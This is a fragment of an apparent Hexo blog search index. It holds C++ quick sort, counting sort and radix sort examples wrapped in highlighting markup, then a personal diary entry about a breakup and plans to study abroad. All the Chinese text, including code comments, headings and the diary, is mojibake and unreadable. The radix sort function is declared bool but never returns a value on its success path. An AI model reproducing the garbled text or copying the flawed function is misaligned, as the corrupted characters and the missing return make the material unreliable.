class="line"><span class="comment">//å¿«é€Ÿæ’åºï¼ˆä»å°åˆ°å¤§ï¼‰</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right, vector&lt;<span class="keyword">int</span>&gt;&amp; arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(left &gt;= right)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">int</span> i, j, base, temp;</span><br><span class="line">i = left, j = right;</span><br><span class="line">base = arr[left];  <span class="comment">//å–æœ€å·¦è¾¹çš„æ•°ä¸ºåŸºå‡†æ•°</span></span><br><span class="line"><span class="keyword">while</span> (i &lt; j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (arr[j] &gt;= base &amp;&amp; i &lt; j)</span><br><span class="line">j--;</span><br><span class="line"><span class="keyword">while</span> (arr[i] &lt;= base &amp;&amp; i &lt; j)</span><br><span class="line">i++;</span><br><span class="line"><span class="keyword">if</span>(i &lt; j)</span><br><span class="line">&#123;</span><br><span class="line">temp = arr[i];</span><br><span class="line">arr[i] = arr[j];</span><br><span class="line">arr[j] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åŸºå‡†æ•°å½’ä½</span></span><br><span class="line">arr[left] = arr[i];</span><br><span class="line">arr[i] = base;</span><br><span class="line"><span class="built_in">quickSort</span>(left, i - <span class="number">1</span>, arr);<span class="comment">//é€’å½’å·¦è¾¹</span></span><br><span class="line"><span class="built_in">quickSort</span>(i + <span class="number">1</span>, right, arr);<span class="comment">//é€’å½’å³è¾¹</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è®¡æ•°æ’åº"><a href="#è®¡æ•°æ’åº" class="headerlink" title="è®¡æ•°æ’åº"></a>è®¡æ•°æ’åº</h2><p>è®¡æ•°æ’åºå¹¶ä¸åŸºäºå…ƒç´ çš„æ¯”è¾ƒï¼Œè€Œæ˜¯ä¸€ç§<strong>åˆ©ç”¨æ•°ç»„ä¸‹æ ‡æ¥ç¡®å®šå…ƒç´ æ­£ç¡®ä½ç½®çš„ç®—æ³•</strong>ã€‚é€šè¿‡å¯¹æ¯ä¸ªæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ è¿›è¡Œç›¸åº”çš„è®¡æ•°ç»Ÿè®¡ï¼Œé€šè¿‡è®¡æ•°å€¼ç¡®å®šå…ƒç´ çš„æ­£ç¡®ä½ç½®çš„æ’åºç®—æ³•ã€‚è®¡æ•°æ’åºéœ€è¦çŸ¥é“å¾…æ’åºæ•°æ®çš„å–å€¼èŒƒå›´ï¼Œä»¥æ–¹ä¾¿ç”³è¯·è¾…åŠ©ç©ºé—´ï¼Œè¿™æ˜¯è®¡æ•°æ’åºçš„ä¸€ä¸ªç¼ºç‚¹ã€‚</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMyLnpoaW1nLmNvbS84MC92Mi03MmYzY2NiZWUzYzA2YzYyMjRkYTgwMTcwNGY1MjVlZl8xNDQwdy5qcGc?x-oss-process=image/format,png" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">counting_sort</span><span class="params">(<span class="keyword">int</span> data[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span>* sorted = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">  <span class="keyword">int</span> max = data[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data[i] &gt; max)</span><br><span class="line">      max = data[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span>* count = <span class="keyword">new</span> <span class="keyword">int</span>[max+<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; max+<span class="number">1</span>; ++i)</span><br><span class="line">    count[i] = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// è®°å½•é¢‘æ¬¡</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    count[data[i]]++;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ç´¯åŠ è®¡æ•°</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= max; i++)</span><br><span class="line">    count[i] += count[i - <span class="number">1</span>];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ç¡®å®šæœ€ç»ˆä½ç½®</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    sorted[count[data[i]] - <span class="number">1</span>] = data[i];</span><br><span class="line">    count[data[i]]--;<span class="comment">//æ³¨æ„</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    data[i] = sorted[i];</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">delete</span> [] sorted;</span><br><span class="line">  <span class="keyword">delete</span> [] count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åŸºæ•°æ’åº"><a href="#åŸºæ•°æ’åº" class="headerlink" title="åŸºæ•°æ’åº"></a>åŸºæ•°æ’åº</h2><p>ä»ä½ä½å¼€å§‹ï¼Œå¯¹æ‰€æœ‰æ•°å­—è¿›è¡Œæ’åºã€‚ä¾‹å¦‚ç¬¬1è½®æ’åºåï¼Œæ•°å­—çš„ä¸ªä½æ•°è¦æœ‰åºï¼›ç¬¬2è½®æ’åºåï¼Œæ•°å­—çš„åä½æ•°è¦æœ‰åºï¼Œå¦‚æœåä½æ•°ç›¸åŒçš„æ•°ï¼Œä¸ªä½æ•°è¦æŒ‰ç…§ä¹‹å‰çš„ç›¸å¯¹é¡ºåºæ‘†æ”¾ï¼›ä¾æ¬¡ç±»æ¨ç›´è‡³æœ€é«˜ä½æ’åºå®Œæˆã€‚åœ¨å¯¹æ¯ä½è¿›è¡Œæ’åºæ—¶ï¼Œé€‰æ‹©çš„æ’åºç®—æ³•ä¸€å®šè¦æ˜¯<strong>ç¨³å®šçš„æ’åº</strong>ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">rxsort</span><span class="params">(<span class="keyword">int</span> A[],<span class="keyword">int</span> l,<span class="keyword">int</span> h,<span class="keyword">int</span> d,<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">NULL</span>==A||l&gt;h)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> size = h-l+<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span>* counts = <span class="keyword">new</span> <span class="keyword">int</span>[k];<span class="comment">//ç”¨äºè®¡æ•°æ’åºçš„è¾…åŠ©æ•°æ®ï¼Œè¯¦è§è®¡æ•°æ’åº</span></span><br><span class="line">    <span class="keyword">int</span>* temp = <span class="keyword">new</span> <span class="keyword">int</span>[size];<span class="comment">//ç”¨äºå­˜å‚¨é‡æ–°æ’åºçš„æ•°ç»„</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">int</span> pval=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//ä¾æ¬¡å¤„ç†ä¸åŒçš„ä½</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;d;i++)&#123;</span><br><span class="line">        <span class="comment">//countsæ•°ç»„æ¸…é›¶</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;k;j++)</span><br><span class="line">            counts[j] = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=l;j&lt;=h;j++)&#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            1.data[j]/pvalï¼šå»æ‰æ•°å­—data[j]çš„åiä¸ªæ•°ï¼Œä¾‹å¦‚ï¼š</span></span><br><span class="line"><span class="comment">            å½“data[j]=1234,i=2æ—¶ï¼Œæ­¤æ—¶pval=100,data[j]/pval=12;</span></span><br><span class="line"><span class="comment">            2.(data[j]/pval)%kï¼šå–æ•°å­—data[j]/pvalçš„æœ€åä¸€ä½æ•°</span></span><br><span class="line"><span class="comment">            3.(int)(data[j]/pval)%k:å–æ•°å­—data[j]çš„ç¬¬iä½æ•°</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            index = (<span class="keyword">int</span>)(A[j]/pval)%k;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            ç»Ÿè®¡æ•°ç»„Aä¸­æ¯ä¸ªæ•°å­—çš„ç¬¬iä½æ•°ä¸­å„ä¸ªæ•°å­—çš„é¢‘æ•°,ç”¨äºè®¡æ•°æ’åºï¼›</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            counts[index]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//è®¡ç®—ç´¯åŠ é¢‘æ•°ï¼Œç”¨æˆ·è®¡æ•°æ’åº</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;k;j++)</span><br><span class="line">            counts[j] = counts[j] + counts[j<span class="number">-1</span>];</span><br><span class="line">        <span class="comment">//ä½¿ç”¨å€’æ•°ç¬¬i+1ä½æ•°å¯¹Aè¿›è¡Œæ’åº</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=h;j&gt;=l;j--)&#123;</span><br><span class="line">            index = (<span class="keyword">int</span>)(A[j]/pval)%k;</span><br><span class="line">            temp[counts[index]<span class="number">-1</span>] = A[j];</span><br><span class="line">            counts[index]--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//å°†æŒ‰ç¬¬iä¸ºæ•°æ’åºåçš„ç»“æœä¿å­˜å›æ•°ç»„Aä¸­</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)</span><br><span class="line">            A[j+l] = temp[j];</span><br><span class="line">        <span class="comment">//æ›´æ–°pval</span></span><br><span class="line">        pval = pval*k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span>[] counts;</span><br><span class="line">    <span class="keyword">delete</span>[] temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>éšç¬”</title>
      <link href="/2021/07/05/%E9%9A%8F%E7%AC%94/"/>
      <url>/2021/07/05/%E9%9A%8F%E7%AC%94/</url>
      
        <content type="html"><![CDATA[<p>ã‚‚ã†çµ‚ã‚ã£ãŸï¼Œä»æœªæƒ³è¿‡ä¼šè¿™æ ·æ½¦è‰æ”¶åœºï¼Œæ›¾è®¥ç¬‘ä¸¤ä¸‰ä¸ªæœˆçš„å¿«é¤å¼æ‹çˆ±ï¼Œä»¥ä¸ºè‡ªå·±ä¸ä¸€æ ·ï¼Œçœ‹æ¥æˆ‘é”™äº†ï¼ˆç¬‘ï¼‰æ˜¯æˆ‘ä¸ç†è§£å…¶ä¸­è‹¦è¡·å§æ²¡æœ‰çœŸæ­£çš„å¯¹ä¸é”™å§ï¼Œæœ‰äº›çŸ›ç›¾æ— æ³•è§£å†³ï¼Œåˆ†æ­§åœ¨ç›¸å¤„ä¸­åªä¼šæ„ˆå‘æ˜¾ç°ï¼Œä¸€æ®µæ„Ÿæƒ…æ„å‘³ç€çš„è´£ä»»ä¹Ÿåªæœ‰èº«å¤„å…¶ä¸­æ‰èƒ½æ„Ÿå—åˆ°ï¼Œå¤§æ¦‚éƒ½ç´¯äº†å§</p><p>ä»Šå¹´çš„æ˜¥è‰²å› ä½ è€Œæ ¼å¤–æ˜è‰³ï¼Œæ„Ÿè°¢ä»æˆ‘çš„ä¸–ç•Œèµ°è¿‡ï¼ŒãŠå…ƒæ°—ã§ã™ã‹ã€ç§ã¯å…ƒæ°—ã§ã™ï¼Œè„‘æµ·è«åæµ®ç°ä¸€èµ·å»çœ‹çš„ã€Šæƒ…ä¹¦ã€‹çš„ååœºæ™¯ã€‚</p><p>itâ€™s probably for the bestï¼Œæˆ‘å¤§æ¦‚æ— æ³•æŠ½å‡ºç²¾åŠ›ç»™ä¸€åœºç»ˆç©¶ä¸ä¼šæœ‰ç»“æœçš„æ„Ÿæƒ…å§â€”â€”ä¸ä¹…å‰ç»ˆäºä¸‹å®šäº†ç•™å­¦çš„å†³å¿ƒï¼Œæˆ–è®¸æ²¡æœ‰é‚£ä¹ˆå¤šæ—¶é—´å»ç©é—¹äº†å§â€¦â€¦ä¸€å¿µæ—¢å®šï¼Œä¸‡å±±éš¾é˜»ï¼Œæ„¿èµ°å‡ºè¿™å¢™å†…ï¼Œå»å¤–é¢çš„ä¸–ç•Œ</p><p>ä¸€å¦‚ä»Šç”Ÿï¼Œ<br>æ— æœ‰ä¹Ÿæ— æ˜¯ï¼Œ<br>æ— ç—›ä¹Ÿæ— ä¹ã€‚</p><p>ä½©ç´¢é˜¿å¯çœŸæ˜¯ä¸ªå¦™äººï¼Œé“ç ´æˆ‘æ­¤æ—¶çš„å¿ƒç†çŠ¶æ€ã€‚ä¼¼ä¹ç¡®å‡¿æ²¡æœ‰æ„Ÿå—åˆ°å¾ˆå¤šç—›è‹¦ï¼Œè¿™æ ·çš„ç»“æœæ˜¯æˆ‘çº ç»“åçš„é€‰æ‹©ï¼Œæ„è¯†åˆ°ä¸åˆé€‚ï¼Œå¤§æŠµå°±åº”è¯¥è¿™èˆ¬å¿«åˆ€æ–©æ–­å§</p><p>ä¸çŸ¥å‘½è¿æ˜¯å¦ä¼šè®©æˆ‘åœ¨å¤§å­¦è®¤è¯†the oneï¼Œæ›´ä¸çŸ¥ä¼šæ˜¯ä»€ä¹ˆæ ·çš„ï¼Œä¸è¿‡æˆ‘æƒ³ï¼Œå¥¹åº”æ˜¯èƒ½å¤Ÿé™ªæˆ‘ä¸€åŒå­¦ä¹ è¿›æ­¥çš„å§ï¼Œâ€œç»¿é¬“è§†è‰ï¼Œçº¢è¢–æ·»é¦™ï¼Œçœ·å±ç–‘ä»™â€ï¼Œåˆç”šè‡³ï¼Œå¥¹èƒ½é™ªæˆ‘ä¸€èµ·å‡ºå›½ï¼Ÿå­¦é•¿å­¦å§çš„äº‹è¿¹ä»¤äººè‰³ç¾¡ï¼ŒåŒåŒèµ´ç¾ï¼Œåªç¾¡é¸³é¸¯ä¸ç¾¡ä»™â€¦â€¦å‘½è¿ä¸€å‘å¾…æˆ‘ä¸è–„ï¼Œæˆ–è®¸ä¼šé‡åˆ°å§</p><p>è¿™çº¢é…’ååŠ²æœ‰ç‚¹è¶³ï¼Œå¤´å±…ç„¶è¿™å°±æ™•äº†ï¼Œæ™šå®‰ï¼Œå—äº¬</p>]]></content>
      
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
